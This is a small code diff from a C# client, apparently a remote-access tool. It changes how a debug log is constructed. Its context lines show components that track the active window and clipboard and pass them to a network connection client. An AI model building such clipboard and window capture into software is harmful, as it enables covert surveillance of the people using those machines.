@@ -247,8 +247,8 @@ namespace Pulsar.Client
 
                 _activeWindowChecker = new ActiveWindowChecker(_connectClient);
                 _clipboardChecker = new ClipboardChecker(_connectClient);
-                _debugLog = new DebugLog(_connectClient);
                 UniversalDebugLogger.Initialize(_connectClient);
+                _debugLog = new DebugLog();
 
                 new Thread(() =>
                 {
